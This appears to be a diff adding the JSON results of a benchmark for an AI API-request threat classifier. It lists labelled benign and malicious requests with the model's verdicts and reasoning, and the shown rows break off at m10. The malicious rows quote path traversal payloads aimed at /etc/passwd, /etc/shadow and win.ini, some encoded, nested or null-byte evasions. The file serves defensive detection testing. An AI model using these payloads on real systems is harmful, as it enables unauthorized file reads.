@@ -1,0 +1,1729 @@
+{
+  "policy": "confidence_without_fast_score",
+  "clean": {
+    "total": 98,
+    "not_clean": 0,
+    "leaks": []
+  },
+  "summary": {
+    "scored": 95,
+    "tp": 36,
+    "fn": 9,
+    "fp": 0,
+    "tn": 50,
+    "accuracy": 0.905
+  },
+  "misses": [
+    "m05",
+    "m18",
+    "m29",
+    "m31",
+    "m32",
+    "m37",
+    "m39",
+    "m40",
+    "m47"
+  ],
+  "false_blocks": [],
+  "rows": [
+    {
+      "id": "b01",
+      "label": "benign",
+      "note": "ordinary undeclared path",
+      "tier": "suspicious",
+      "fast_score": 0.55,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.05,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "GET /api/health has empty query and body with no dot-dot segments, sensitive file targets, object IDs, or injected payload. The only signal is undeclared path in OpenAPI with 3 requests in window, which for a standard health check does not show traversal, BOLA, mass assignment, or injection technique."
+      }
+    },
+    {
+      "id": "b02",
+      "label": "benign",
+      "note": "ordinary undeclared path",
+      "tier": "suspicious",
+      "fast_score": 0.55,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.12,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "GET /api/metrics has empty query and body with no traversal, injection, BOLA ID, or mass-assignment fields. The only signal is undeclared path per OpenAPI validation with 3 requests in window and no prior history, which alone is not an attack technique."
+      }
+    },
+    {
+      "id": "b03",
+      "label": "benign",
+      "note": "ordinary undeclared path",
+      "tier": "suspicious",
+      "fast_score": 0.55,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.05,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "GET /api/ready has empty query and zero-length body with no traversal, injection, or mass-assignment indicators. Undocumented path alone matches a standard readiness probe, not an attack technique. Rate window of 3 requests with no history shows no abuse."
+      }
+    },
+    {
+      "id": "b04",
+      "label": "benign",
+      "note": "ordinary undeclared path",
+      "tier": "suspicious",
+      "fast_score": 0.55,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.08,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "GET /api/ping has empty query and body with no dot-dot segments, object IDs, or injection payloads. Schema flags path as undeclared, but no traversal, BOLA, mass-assignment, or injection technique is present. Rate window shows only 3 requests, with no prior history indicating abuse."
+      }
+    },
+    {
+      "id": "b05",
+      "label": "benign",
+      "note": "ordinary undeclared path",
+      "tier": "suspicious",
+      "fast_score": 0.55,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.1,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "GET /api/version has empty query and zero-length body with no ../, SQL, command, or object-id indicators. OpenAPI non-declaration alone with only 3 requests in window and no prior history does not show traversal, BOLA, mass assignment, or injection technique."
+      }
+    },
+    {
+      "id": "b06",
+      "label": "benign",
+      "note": "ordinary undeclared path",
+      "tier": "suspicious",
+      "fast_score": 0.55,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.08,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "GET /api/docs has empty query and body with no dot-dot segments, object IDs, or undeclared fields. OpenAPI flags path as undeclared but no traversal, BOLA, mass assignment, or injection technique is present. Low request count of 3 does not indicate rate abuse."
+      }
+    },
+    {
+      "id": "b07",
+      "label": "benign",
+      "note": "ordinary undeclared path",
+      "tier": "suspicious",
+      "fast_score": 0.55,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.08,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "GET /api/changelog has empty query and zero-length body with no traversal sequences, object IDs, or injection payloads. Undeclared path alone does not show attack technique and rate window shows only 3 requests with no enumeration."
+      }
+    },
+    {
+      "id": "b08",
+      "label": "benign",
+      "note": "ordinary undeclared path",
+      "tier": "suspicious",
+      "fast_score": 0.55,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.08,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "GET /api/status has empty query and body with no dot-dot segments, injection payloads, or object IDs. Undeclared path alone without attack technique is not malicious, and 3 requests in window is not rate abuse."
+      }
+    },
+    {
+      "id": "b09",
+      "label": "benign",
+      "note": "ordinary undeclared path",
+      "tier": "suspicious",
+      "fast_score": 0.55,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.1,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "GET /api/support/hours has empty query and body with no dot-dot segments, sensitive file targets, or injection payloads. With only 3 requests in window and no prior history, the undeclared-path schema violation alone shows no traversal, BOLA, mass assignment, or injection technique."
+      }
+    },
+    {
+      "id": "b10",
+      "label": "benign",
+      "note": "ordinary undeclared path",
+      "tier": "suspicious",
+      "fast_score": 0.55,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.12,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "GET /api/stores/nearby has empty query and zero-length body with no dot-dot segments, injection payloads, or object IDs. Schema non-declaration alone with only 3 requests in window and no history shows no traversal, BOLA, mass assignment, or injection technique."
+      }
+    },
+    {
+      "id": "b11",
+      "label": "benign",
+      "note": "ordinary undeclared path",
+      "tier": "suspicious",
+      "fast_score": 0.55,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.1,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "Request is GET /api/receipts/lookup with empty query and zero-length body, containing no dot-dot segments, SQL/command payloads, or object identifiers. OpenAPI non-declaration alone without traversal, BOLA, mass-assignment, or injection technique and only 3 requests in window does not establish malicious intent."
+      }
+    },
+    {
+      "id": "b12",
+      "label": "benign",
+      "note": "ordinary undeclared path",
+      "tier": "suspicious",
+      "fast_score": 0.55,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.08,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "GET /api/files/preview has empty query and empty body with no dot-dot segments, SQL, commands, or object IDs. Schema shows path undeclared but no traversal, BOLA, mass-assignment, or injection technique is present, with no history and only 3 requests in window."
+      }
+    },
+    {
+      "id": "b13",
+      "label": "benign",
+      "note": "ordinary undeclared path",
+      "tier": "suspicious",
+      "fast_score": 0.55,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.12,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "GET /api/search/suggest has empty query and zero-length body with no ../ segments, SQL, commands, or object IDs. Schema non-declaration alone is not a traversal, BOLA, mass-assignment, or injection technique. Rate window of 3 with no prior history shows no enumeration or abuse pattern."
+      }
+    },
+    {
+      "id": "b14",
+      "label": "benign",
+      "note": "ordinary undeclared path",
+      "tier": "suspicious",
+      "fast_score": 0.55,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.05,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "GET /api/comments/guidelines has empty query and body with no traversal segments, injection payload, or object IDs. The only finding is undeclared path in OpenAPI, which alone shows no attack technique."
+      }
+    },
+    {
+      "id": "b15",
+      "label": "benign",
+      "note": "ordinary undeclared path",
+      "tier": "suspicious",
+      "fast_score": 0.55,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.15,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "GET /api/users/42/preferences has no traversal, injection, or body fields for mass assignment. History shows no enumeration of distinct IDs and only 3 requests in window. An undeclared path alone without BOLA, traversal, or injection technique does not establish attack."
+      }
+    },
+    {
+      "id": "b16",
+      "label": "benign",
+      "note": "gift fields",
+      "tier": "suspicious",
+      "fast_score": 0.5,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.15,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "POST /api/orders declares only item, note, qty, so gift_wrap and card_message are undeclared but are routine order options, not privileged fields like role, is_admin or owner_id. Body with \"Happy birthday, Sam.\" shows no traversal climb, injection, or BOLA object access."
+      }
+    },
+    {
+      "id": "b17",
+      "label": "benign",
+      "note": "loyalty id",
+      "tier": "suspicious",
+      "fast_score": 0.5,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.15,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "POST /api/orders matches its declared operation with only loyalty_id as undeclared field, which is not a privileged mass-assignment field like role, is_admin, or owner_id. Body values item mug, qty 2, and note \"It's a gift; please include a receipt.\" show no traversal climb, SQL structure change, or command. No history and low anomaly risk 0.35 support a benign extra field."
+      }
+    },
+    {
+      "id": "b18",
+      "label": "benign",
+      "note": "sms channel",
+      "tier": "suspicious",
+      "fast_score": 0.5,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.12,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "Extra field channel=\"sms\" is undeclared but is not a privileged mass-assignment field like role, is_admin, or owner_id. Text is a benign delivery note with no SQL structure or directory climb and matches declared POST /api/comments with order_id 12."
+      }
+    },
+    {
+      "id": "b19",
+      "label": "benign",
+      "note": "photo name",
+      "tier": "suspicious",
+      "fast_score": 0.5,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.12,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "POST /api/comments matches its declared operation with only extra field photo_name=\"packing-final.jpg\", a plain filename with no climb or privileged attribute. Text \"Version..final...\" contains '..' but no slash, climb out of allowed directory, or sensitive file. No SQL delimiters, commands, or BOLA evidence are present."
+      }
+    },
+    {
+      "id": "b20",
+      "label": "benign",
+      "note": "search hint",
+      "tier": "suspicious",
+      "fast_score": 0.5,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.15,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "POST /api/search matches declared searchCatalog which allows only query, and extra field hint=\"refund\" is not a privileged mass-assignment property like role, is_admin, or owner_id. Query value about order 4412 contains no directory climb, SQL/command, or BOLA attempt."
+      }
+    },
+    {
+      "id": "b21",
+      "label": "benign",
+      "note": "review locale",
+      "tier": "suspicious",
+      "fast_score": 0.5,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.1,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "Request matches declared POST /api/reviews with expected fields order_id, rating, title plus extra locale=\"he-IL\". Locale is a benign localization value, not a privileged mass-assignment field like role, is_admin, or owner_id. No traversal, injection, or BOLA indicators are present."
+      }
+    },
+    {
+      "id": "b22",
+      "label": "benign",
+      "note": "callback phone",
+      "tier": "suspicious",
+      "fast_score": 0.5,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.15,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "POST /api/tickets matches declared operation with legitimate subject 'Wrong color' and body about scarf color. Undeclared field phone with value '+972-50-000-0000' is a routine contact number, not a privileged mass-assignment field like role or is_admin, with no traversal or injection payload."
+      }
+    },
+    {
+      "id": "b23",
+      "label": "benign",
+      "note": "doorbell name",
+      "tier": "suspicious",
+      "fast_score": 0.5,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.12,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "POST /api/addresses matches its declared operation with expected fields line1, city, postal_code. The extra field doorbell with value Cohen is a non-privileged delivery detail, not a privileged target like role or is_admin, and shows no traversal, injection, or BOLA behavior."
+      }
+    },
+    {
+      "id": "b24",
+      "label": "benign",
+      "note": "receipt email",
+      "tier": "suspicious",
+      "fast_score": 0.5,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.15,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "POST /api/payments matches declared operation with expected fields amount, currency, order_id. Extra field receipt_email with value dana@example.com is non-privileged and not a mass-assignment target like role, is_admin, or owner_id, with no traversal, injection, or BOLA evidence."
+      }
+    },
+    {
+      "id": "b25",
+      "label": "benign",
+      "note": "cart gift note",
+      "tier": "suspicious",
+      "fast_score": 0.5,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.15,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "POST /api/cart declares only item and qty, so gift_note is undeclared but is not a privileged mass-assignment field like role, is_admin, or owner_id. Its value \"For the office.\" is benign text with no traversal, SQL, or command payload and no BOLA object reference."
+      }
+    },
+    {
+      "id": "b26",
+      "label": "benign",
+      "note": "real surname plus timezone",
+      "tier": "suspicious",
+      "fast_score": 0.5,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.15,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "Request matches declared PATCH /api/users/{userId} with allowed display_name field; extra timezone=Asia/Jerusalem is non-privileged preference, not role/is_admin/permissions. No traversal climb, SQL/command execution, or BOLA evidence; O'Brien apostrophe is normal name punctuation."
+      }
+    },
+    {
+      "id": "b27",
+      "label": "benign",
+      "note": "profile plus locale",
+      "tier": "suspicious",
+      "fast_score": 0.5,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.12,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "Request matches declared PATCH /api/users/{userId} with allowed fields display_name and email. Extra field locale=\"he-IL\" is a non-privileged language preference, not a privileged field like role, is_admin, or permissions. No traversal climb, BOLA evidence, or injection technique is present."
+      }
+    },
+    {
+      "id": "b28",
+      "label": "benign",
+      "note": "student quoting SQL",
+      "tier": "suspicious",
+      "fast_score": 0.75,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.05,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "Body text \"The textbook chapter on UNION SELECT is confusing; I am not asking you to run it\" names the technique in ordinary language with no delimiter, always-true boolean, stacked statement, or comment to change query structure. Request matches declared POST /api/comments with only order_id and text and shows no traversal climb or extra fields."
+      }
+    },
+    {
+      "id": "b29",
+      "label": "benign",
+      "note": "docs mention a relative image",
+      "tier": "hard_block",
+      "fast_score": 0.95,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.08,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "The query contains only /../images/logo.png which resolves to the public images/logo.png asset and does not climb to sensitive files. The text describes it as 'a relative public asset' with no continued climbing, matching the documentation exception. It matches declared POST /api/search with no BOLA, mass assignment, or injection."
+      }
+    },
+    {
+      "id": "b30",
+      "label": "benign",
+      "note": "docs mention a stylesheet path",
+      "tier": "hard_block",
+      "fast_score": 0.95,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.12,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "Body query contains \"/../assets/site.css\", a single parent reference resolving to public assets/site.css with no continued climbing. Retrieved patterns state one relative step staying inside public content is documentation, not traversal. Request matches declared POST /api/search with allowed query field and names no sensitive file."
+      }
+    },
+    {
+      "id": "b31",
+      "label": "benign",
+      "note": "customer quotes a tutorial path",
+      "tier": "hard_block",
+      "fast_score": 0.95,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.12,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "Body text contains only single '/../' in '/../guides/returns.pdf' resolving to public guides/returns.pdf with no climb to secrets or OS files. POST /api/comments matches declared fields order_id,text with no encoding evasion or extra assignment. Retrieved pattern states one relative step staying inside public content is not traversal."
+      }
+    },
+    {
+      "id": "b32",
+      "label": "benign",
+      "note": "punctuation-heavy public filename",
+      "tier": "suspicious",
+      "fast_score": 0.55,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.12,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "Query name decodes to <final>[v2]!$.pdf with no ../ segments, slashes, or sensitive file targets, so no traversal technique is present. Path /api/files/preview is undeclared versus GET /api/files downloadFile but carries only the declared name parameter with no injection, BOLA, or body, consistent with low 0.30 risk."
+      }
+    },
+    {
+      "id": "b33",
+      "label": "benign",
+      "note": "punctuation-heavy but real complaint",
+      "tier": "suspicious",
+      "fast_score": 0.5,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.12,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "POST /api/tickets matches the declared operation with only subject and body, and the sole extra field order_ref=\"4412\" is non-privileged and consistent with body text order #4412. No traversal climb, sensitive file target, injection execution, or privileged fields like role/is_admin are present."
+      }
+    },
+    {
+      "id": "b34",
+      "label": "benign",
+      "note": "review that mentions select and union in prose",
+      "tier": "suspicious",
+      "fast_score": 0.5,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.12,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "Undeclared field 'recommend' with value 'more colors' is benign extra text, not a privileged mass-assignment attribute. Title phrase about 'union of blue and grey options' uses union in ordinary language without SQL delimiters, boolean logic, or traversal climb."
+      }
+    },
+    {
+      "id": "b35",
+      "label": "benign",
+      "note": "ordinary comment that looks noisy",
+      "tier": "suspicious",
+      "fast_score": 0.5,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.12,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "Undeclared field source='web' is non-privileged metadata, not a privileged mass-assignment target like role, is_admin, or owner_id. Text \"O'Brien's order arrived; don't ring the bell.\" contains only natural apostrophes with no boolean, UNION, stacked statement, or comment to change query structure, and matches declared POST /api/comments."
+      }
+    },
+    {
+      "id": "b36",
+      "label": "benign",
+      "note": "ordinary comment that looks noisy",
+      "tier": "suspicious",
+      "fast_score": 0.5,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.08,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "Extra field source=\"web\" is non-privileged client metadata, not a role, ownership, or price field. Text \"Size is 4 < 5 && the color is fine\" is ordinary product language with no SQL delimiter/tautology and no parent-directory climb."
+      }
+    },
+    {
+      "id": "b37",
+      "label": "benign",
+      "note": "ordinary comment that looks noisy",
+      "tier": "suspicious",
+      "fast_score": 0.5,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.12,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "POST /api/comments matches its declared operation requiring only order_id and text. Extra field source=\"web\" is undeclared but is non-privileged metadata, not a privileged mass-assignment indicator like role, is_admin, or owner_id. Text \"Tracking said 10:00-14:00; nobody was home.\" is a benign delivery note with no traversal climb, injection, or authorization bypass."
+      }
+    },
+    {
+      "id": "b38",
+      "label": "benign",
+      "note": "ordinary comment that looks noisy",
+      "tier": "suspicious",
+      "fast_score": 0.5,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.12,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "Request matches declared POST /api/comments with only one extra field \"source\":\"web\", which is not a privileged mass-assignment field like role, is_admin, or owner_id. Body text about mug cotton mistake contains no traversal climb, SQL/command, or BOLA evidence. Low anomaly risk 0.34 and 3 requests in window do not indicate abuse."
+      }
+    },
+    {
+      "id": "b39",
+      "label": "benign",
+      "note": "ordinary comment that looks noisy",
+      "tier": "suspicious",
+      "fast_score": 0.5,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.12,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "POST /api/comments matches its declared operation and the only undeclared field is source=\"web\", which is non-privileged unlike role, is_admin or owner_id. The text \"Email me at noa+shop@example.com about this.\" contains no directory climb, injection payload, or authorization bypass, with only 3 requests in the rate window."
+      }
+    },
+    {
+      "id": "b40",
+      "label": "benign",
+      "note": "prose mention of UNION ALL SELECT",
+      "tier": "suspicious",
+      "fast_score": 0.75,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.08,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "The text 'Chapter 3 says UNION ALL SELECT is a teaching example only' only names the technique in ordinary language and does not form a statement with delimiter, tautology, or executable UNION payload. The undeclared field source='web' is a benign value, not a privileged attribute overwrite. No traversal climb or executable injection is present."
+      }
+    },
+    {
+      "id": "b41",
+      "label": "benign",
+      "note": "ordinary comment that looks noisy",
+      "tier": "suspicious",
+      "fast_score": 0.5,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.08,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "Text contains a single ../images/icon.png reference that stays inside public content and does not keep climbing or target sensitive files. Undeclared field source with value \"web\" is non-privileged and does not match mass-assignment indicators like role, is_admin, or owner_id."
+      }
+    },
+    {
+      "id": "b42",
+      "label": "benign",
+      "note": "ordinary comment that looks noisy",
+      "tier": "suspicious",
+      "fast_score": 0.5,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.1,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "POST /api/comments declares only order_id and text, and extra field source with value \"web\" is not a privileged mass-assignment target like role or is_admin. Text \"Please wrap it; the card should read: Happy 40th!\" contains no traversal climb, SQL structure change, or command execution. No BOLA evidence from single order_id 5 with no prior history."
+      }
+    },
+    {
+      "id": "m01",
+      "label": "malicious",
+      "note": "plain traversal",
+      "tier": "hard_block",
+      "fast_score": 0.95,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.98 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.98,
+        "recommended_action": "block",
+        "threat_type": "path_traversal",
+        "reasoning": "Query parameter name=../../etc/passwd contains two parent-directory climbs resolving to sensitive file /etc/passwd. Per retrieved pattern, a climb alone with no legitimate prefix is still traversal when it leaves the allowed directory. The GET /api/files operation is for public documents, so this attempts to escape that directory."
+      }
+    },
+    {
+      "id": "m02",
+      "label": "malicious",
+      "note": "double-encoded traversal",
+      "tier": "hard_block",
+      "fast_score": 0.95,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.97 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.97,
+        "recommended_action": "block",
+        "threat_type": "path_traversal",
+        "reasoning": "The name value %252e%252e%252fetc%252fpasswd double-decodes to ../etc/passwd, a parent-directory climb to sensitive OS file etc/passwd. Double-encoding shows evasion and a climb without legitimate prefix is still traversal per retrieved patterns."
+      }
+    },
+    {
+      "id": "m03",
+      "label": "malicious",
+      "note": "encoded windows target",
+      "tier": "hard_block",
+      "fast_score": 0.95,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.95 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.95,
+        "recommended_action": "block",
+        "threat_type": "path_traversal",
+        "reasoning": "The query name=..%2f..%2fwindows/win.ini decodes to ../../windows/win.ini with two parent-directory climbs targeting an OS file. This leaves the public document directory for GET /api/files and matches encoded traversal evasion."
+      }
+    },
+    {
+      "id": "m04",
+      "label": "malicious",
+      "note": "stream wrapper",
+      "tier": "hard_block",
+      "fast_score": 0.95,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.97 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.97,
+        "recommended_action": "block",
+        "threat_type": "path_traversal",
+        "reasoning": "GET /api/files with name=file:///etc/passwd requests sensitive OS file /etc/passwd instead of a public document. The declared downloadFile operation expects a public document name, so absolute file URI leaves allowed directory. This matches sensitive-location-with-no-prefix traversal technique."
+      }
+    },
+    {
+      "id": "m05",
+      "label": "malicious",
+      "note": "null byte",
+      "tier": "hard_block",
+      "fast_score": 0.95,
+      "tool_trace": [],
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.08,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "Query name=report.pdf%00.png contains no ../, encoded climb, or slash and shows no parent-directory climb out of allowed directory. It matches declared operation GET /api/files for public document download as a single filename. Null-byte suffix alone without climbing does not meet traversal technique."
+      }
+    },
+    {
+      "id": "m06",
+      "label": "malicious",
+      "note": "traversal in a comment",
+      "tier": "hard_block",
+      "fast_score": 0.95,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.95 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.95,
+        "recommended_action": "block",
+        "threat_type": "path_traversal",
+        "reasoning": "The text field in POST /api/comments contains ../../../.. climbing to /etc/shadow, a sensitive OS file. Free-text fields are sinks and a climb with no legitimate prefix that reaches outside allowed content is traversal per CWE-22. No delivery comment legitimately needs the shadow password file."
+      }
+    },
+    {
+      "id": "m07",
+      "label": "malicious",
+      "note": "traversal in search",
+      "tier": "hard_block",
+      "fast_score": 0.95,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.92 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.92,
+        "recommended_action": "block",
+        "threat_type": "path_traversal",
+        "reasoning": "POST /api/search query field contains '../../' climbing to 'etc/hosts', a sensitive OS file. Free-text search query is a traversal sink and the double parent climb leaves the allowed catalog directory. This matches CWE-22 dot-dot traversal requiring block."
+      }
+    },
+    {
+      "id": "m08",
+      "label": "malicious",
+      "note": "obfuscated traversal",
+      "tier": "hard_block",
+      "fast_score": 0.95,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.92 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.92,
+        "recommended_action": "block",
+        "threat_type": "path_traversal",
+        "reasoning": "Ticket body 'see ....//....//etc/passwd' uses nested ....// evasion that decodes to parent-directory climbs targeting /etc/passwd. Free-text ticket field naming a sensitive OS credential file with climbs leaving application content matches traversal-in-free-text and sensitive-file patterns."
+      }
+    },
+    {
+      "id": "m09",
+      "label": "malicious",
+      "note": "traversal in a title",
+      "tier": "hard_block",
+      "fast_score": 0.95,
+      "tool_trace": [],
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.95 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.95,
+        "recommended_action": "block",
+        "threat_type": "path_traversal",
+        "reasoning": "The free-text title field contains \"/../etc/passwd\" with a dot-dot segment that climbs out of allowed content. It names sensitive OS file etc/passwd, matching path traversal via free-text sink that leaves the application root."
+      }
+    },
+    {
+      "id": "m10",
+      "label": "malicious",
+      "note": "encoded proc path",
+      "tier": "hard_block",
